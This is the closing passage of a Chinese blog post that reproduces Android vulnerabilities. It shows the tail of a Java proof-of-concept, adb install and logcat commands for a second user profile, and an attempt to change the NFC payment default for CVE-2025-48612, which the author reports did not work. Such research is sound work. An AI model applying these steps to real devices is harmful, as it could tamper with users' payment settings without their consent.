<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span><span style="color:#1E754F;--shiki-dark:#4D9375"> catch</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">(</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE">Exception </span><span style="color:#B07D48;--shiki-dark:#BD976A">e</span><span style="color:#a65e2b;--shiki-dark:#d4976c">)</span><span style="color:#999999;--shiki-dark:#666666"> </span><span style="color:#a65e2b;--shiki-dark:#d4976c">{</span></span>
<span class="line"><span style="color:#A0ADA0;--shiki-dark:#758575DD">            // 如果再次失败，日志会告诉我们新的原因</span></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BD976A">            Log</span><span style="color:#999999;--shiki-dark:#666666">.</span><span style="color:#59873A;--shiki-dark:#80A665">e</span><span style="color:#a13865;--shiki-dark:#d9739f">(</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#B56959;--shiki-dark:#C98A7D">POC</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#B5695977;--shiki-dark:#C98A7D77"> "</span><span style="color:#B56959;--shiki-dark:#C98A7D">Exploit failed</span><span style="color:#B5695977;--shiki-dark:#C98A7D77">"</span><span style="color:#999999;--shiki-dark:#666666">,</span><span style="color:#393A34;--shiki-dark:#DBD7CAEE"> e</span><span style="color:#a13865;--shiki-dark:#d9739f">)</span><span style="color:#999999;--shiki-dark:#666666">;</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">        </span><span style="color:#a65e2b;--shiki-dark:#d4976c">}</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#666666">    </span><span style="color:#1e754f;--shiki-dark:#4d9375">}</span></span>
<span class="line"><span style="color:#2993a3;--shiki-dark:#5eaab5">}</span></span></code></pre>
<h4 id="22-编译运行"><a class="anchor" href="#22-编译运行">#</a> 2.2 编译运行</h4>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121174747771.png" alt="image-20260121174747771"></p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121180313891.png" alt="image-20260121180313891"></p>
<p>安装，必须安装在User 10</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>adb install --user 10 poc_app.apk</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121180450394.png" alt="image-20260121180450394"></p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 清除旧日志</span></span>
<span class="line"><span>adb logcat -c </span></span>
<span class="line"><span></span></span>
<span class="line"><span># 启动 User 10 的日志监控，过滤 POC 标签和 AndroidRuntime 崩溃信息</span></span>
<span class="line"><span>adb logcat | grep -E "POC|AndroidRuntime|ActivityManager"</span></span></code></pre>
<p>第一次没成功，查看原因</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121193103719.png" alt="image-20260121193103719"></p>
<p>修改 <code>MainActivity.java</code> 中的 <code>exploit()</code> 方法，使用隐式 Intent (<code>android.settings.NFC_PAYMENT_SETTINGS</code>) 来替代显式 Intent。</p>
<p>然后再次安装，执行poc_app，自动跳转到NFC设置：</p>
<p>&lt;img src="<a target="_blank" rel="noopener" href="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/Screenshot_20250402-072952%5B1%5D.png">https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/Screenshot_20250402-072952[1].png</a>" alt="img" style="zoom:25%;" /&gt;</p>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121194513678.png" alt="image-20260121194513678"></p>
<p>界面成功跳转到 NFC 支付设置，执行命令查看：</p>
<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>adb shell dumpsys nfc | grep "Current wallet payment service"</span></span></code></pre>
<p><img loading="lazy" src="https://blog-vvwwvv.oss-cn-hangzhou.aliyuncs.com/img/image-20260121203719318.png" alt="image-20260121203719318"></p>
<p>user0下没有切换，看来是没有成功，，，</p>
<div class="tags"><a href="/tags/Android/" rel="tag"><i class="ic i-tag"></i>Android</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"><i class="ic i-tag"></i>漏洞复现</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-01-21 20:51:07" itemprop="dateModified" datetime="2026-01-21T20:51:07+08:00">2026-01-21</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>vvwwv<i class="ic i-at"><em>@</em></i>此时相望不相闻，愿逐月华流照君</li><li class="link"><strong>本文链接：</strong><a href="https://cyb141520.github.io/2026/01/14/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/Android%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Android漏洞复现">https://cyb141520.github.io/2026/01/14/安卓安全/Android漏洞复现/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/01/10/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Apixel%E5%88%B7%E6%9C%BA/" rel="prev" itemprop="url" data-background-image="https://starwalk.space/gallery/images/msdec-01/1140x641.jpg" title="安卓安全（一）：pixel刷机及root"><span class="type">上一篇</span><span class="category"><i class="ic i-flag"></i>Android</span><h3>安卓安全（一）：pixel刷机及root</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-cve-2025-32328"><span class="toc-number">1.</span> <span class="toc-text"> 一、CVE-2025-32328</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.1.</span> <span class="toc-text"> (一) 漏洞原因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-nvd%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1. NVD描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-commit%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2. commit信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-diff%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3. diff信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.</span> <span class="toc-text"> (二) 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B7%BB%E5%8A%A0%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6r-%E7%9A%84%E5%85%B3%E9%94%AE%E6%9D%A5%E6%BA%90"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1. 添加资源文件（R 的关键来源）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%89%E8%A3%85-apk"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2. 安装 APK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 3. 漏洞利用：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-cve-2025-48573"><span class="toc-number">2.</span> <span class="toc-text"> 二、CVE-2025-48573</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0-2"><span class="toc-number">2.1.</span> <span class="toc-text"> (一) 漏洞原因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-nvd%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 1. NVD描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-commit%E4%BF%A1%E6%81%AF-2"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 2. commit信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-diff%E4%BF%A1%E6%81%AF-2"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 3. diff信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text"> (二)漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%8E%AF%E5%A2%83"><span class="toc-number">2.2.1.</span> <span class="toc-text"> 1.环境</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">2.3.</span> <span class="toc-text"> (二)漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%8E%AF%E5%A2%83-2"><span class="toc-number">2.3.1.</span> <span class="toc-text"> 1.环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2poc"><span class="toc-number">2.3.2.</span> <span class="toc-text"> 2.POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#a-androidmanifestxml"><span class="toc-number">2.3.2.1.</span> <span class="toc-text"> A. AndroidManifest.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#b-vulnerableservicejava-%E6%94%BB%E5%87%BB%E9%80%BB%E8%BE%91%E6%A0%B8%E5%BF%83"><span class="toc-number">2.3.2.2.</span> <span class="toc-text"> B. VulnerableService.java (攻击逻辑核心)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c-foregroundservicetargetjava-%E9%AA%8C%E8%AF%81%E7%9B%AE%E6%A0%87"><span class="toc-number">2.3.2.3.</span> <span class="toc-text"> C. ForegroundServiceTarget.java (验证目标)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#d-mainactivityjava-%E5%90%AF%E5%8A%A8%E5%99%A8"><span class="toc-number">2.3.2.4.</span> <span class="toc-text"> D. MainActivity.java (启动器)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.3.3.</span> <span class="toc-text"> 3.复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#31%E7%BC%96%E8%AF%91%E5%8F%8A%E5%AE%89%E8%A3%85"><span class="toc-number">2.3.3.0.1.</span> <span class="toc-text"> 3.1编译及安装</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97"><span class="toc-number">2.3.3.1.</span> <span class="toc-text"> 3.2查看日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#33%E5%90%AF%E5%8A%A8app"><span class="toc-number">2.3.3.2.</span> <span class="toc-text"> 3.3启动APP</span></a></li></ol></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-cve-2025-48612"><span class="toc-number">3.</span> <span class="toc-text"> 三、CVE-2025-48612</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">3.1.</span> <span class="toc-text"> （一）漏洞原因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1nvd%E6%8F%8F%E8%BF%B0"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 1.NVD描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2commit%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 2.commit信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3diff%E4%BF%A1%E6%81%AF"><span class="toc-number">3.1.3.</span> <span class="toc-text"> 3.diff信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E5%88%86%E6%9E%90"><span class="toc-number">3.1.4.</span> <span class="toc-text"> 4.分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">3.2.</span> <span class="toc-text"> （二）漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%AE%89%E8%A3%85%E7%9B%AE%E6%A0%87nfc%E5%BA%94%E7%94%A8"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 1.安装目标NFC应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#11-%E7%BC%96%E5%86%99mainactivitykt"><span class="toc-number">3.2.1.1.</span> <span class="toc-text"> 1.1 编写MainActivity.kt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-%E7%BC%96%E5%86%99-androidmanifestxml"><span class="toc-number">3.2.1.2.</span> <span class="toc-text"> 1.2 编写 AndroidManifest.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#13-%E5%88%9B%E5%BB%BA%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6-resxmlapduservicexml"><span class="toc-number">3.2.1.3.</span> <span class="toc-text"> 1.3 创建资源文件 res/xml/apduservice.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#14-%E5%88%9B%E5%BB%BA%E7%A9%BA%E7%9A%84-service-%E7%B1%BB"><span class="toc-number">3.2.1.4.</span> <span class="toc-text"> 1.4  创建空的 Service 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#15-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85"><span class="toc-number">3.2.1.5.</span> <span class="toc-text"> 1.5 编译安装</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%AE%89%E8%A3%85%E6%94%BB%E5%87%BB%E5%BA%94%E7%94%A8"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 2.安装攻击应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21mainactivityjava-%E4%B8%AD%E7%BC%96%E5%86%99%E5%A6%82%E4%B8%8B%E4%BB%A3%E7%A0%81"><span class="toc-number">3.2.2.1.</span> <span class="toc-text"> 2.1MainActivity.java 中编写如下代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#22-%E7%BC%96%E8%AF%91%E8%BF%90%E8%A1%8C"><span class="toc-number">3.2.2.2.</span> <span class="toc-text"> 2.2 编译运行</span></a></li></ol></li></ol></li></ol></li></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2026/01/14/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/Android%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="Android漏洞复现">Android漏洞复现</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="vvwwv" src="/assets/avatar.avif"><p class="name" itemprop="name">vvwwv</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">14</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">13</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">8</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/yourname" class="item github" title="https://github.com/yourname"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/01/10/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Apixel%E5%88%B7%E6%9C%BA/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="分类于二进制安全">二进制安全</a></div><span><a href="/2023/10/07/pwn%E4%B8%93%E6%A0%8F/FORTIFY/">FORTIFY_SOURCE（例题：CTFshow的pwn32）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Android/" title="分类于Android">Android</a><i class="ic i-angle-right"></i><a href="/categories/Android/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于漏洞复现">漏洞复现</a></div><span><a href="/2026/01/14/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/Android%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Android漏洞复现</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="分类于二进制安全">二进制安全</a></div><span><a href="/2023/08/29/pwn%E4%B8%93%E6%A0%8F/DynELF/">DynELF</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/%E4%B8%93%E6%A0%8F/" title="分类于专栏">专栏</a></div><span><a href="/2025/08/06/pwn%E4%B8%93%E6%A0%8F/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E_new/">格式化字符串</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Android/" title="分类于Android">Android</a></div><span><a href="/2026/01/10/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Apixel%E5%88%B7%E6%9C%BA/">安卓安全（一）：pixel刷机及root</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="分类于二进制安全">二进制安全</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/%E5%A0%86%E5%88%A9%E7%94%A8/" title="分类于堆利用">堆利用</a></div><span><a href="/2023/10/05/pwn%E4%B8%93%E6%A0%8F/large_bin_attack/">large bin attack（为house利用系列打下基础）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="分类于二进制安全">二进制安全</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/how2heap/" title="分类于how2heap">how2heap</a></div><span><a href="/2023/10/19/pwn%E4%B8%93%E6%A0%8F/how2heap(2)/">how2heap</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="分类于二进制安全">二进制安全</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/ROP/" title="分类于ROP">ROP</a></div><span><a href="/2023/10/01/pwn%E4%B8%93%E6%A0%8F/ret2dlresolve/">高级ROP之ret2dlresolve</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a><i class="ic i-angle-right"></i><a href="/categories/CTF/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/CTF/PWN%E4%B8%93%E6%A0%8F/ROP/" title="分类于ROP">ROP</a><i class="ic i-angle-right"></i><a href="/categories/CTF/PWN%E4%B8%93%E6%A0%8F/ROP/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="分类于二进制安全">二进制安全</a></div><span><a href="/2023/08/24/pwn%E4%B8%93%E6%A0%8F/ret2csu/">64位构造通用ROP，ret2csu</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/PWN%E4%B8%93%E6%A0%8F/" title="分类于PWN专栏">PWN专栏</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="分类于二进制安全">二进制安全</a><i class="ic i-angle-right"></i><a href="/categories/PWN%E4%B8%93%E6%A0%8F/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/how2heap/" title="分类于how2heap">how2heap</a></div><span><a href="/2023/10/19/pwn%E4%B8%93%E6%A0%8F/how2heap/">how2heap</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">© 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">vvwwv @ vvwwv</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">152k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">2:19</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config="" type="text/javascript">var LOCAL = {
    ispost: true,
    path: `2026/01/14/安卓安全/Android漏洞复现/`,
    favicon: {
        show: `o(*￣3￣)o 欢迎回来！`,
        hide: `(xB_xB) 崩溃啦！`
    },
    search: {
        placeholder: "文章搜索",
        empty: "关于 「 ${query} 」，什么也没搜到",
        stats: "${time} ms 内找到 ${hits} 条结果"
    },
    nocopy: "false",
    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
    copy_tex: false,
    katex: false,
    mermaid: false,
    audio: undefined,
    nocopy: false,
    outime: true,
    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
    quiz: {
        choice: `单选题`,
        multiple: `多选题`,
        true_false: `判断题`,
        essay: `问答题`,
        gap_fill: `填空题`,
        mistake: `错题备注`
    }
};
</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer=""></script></body></html>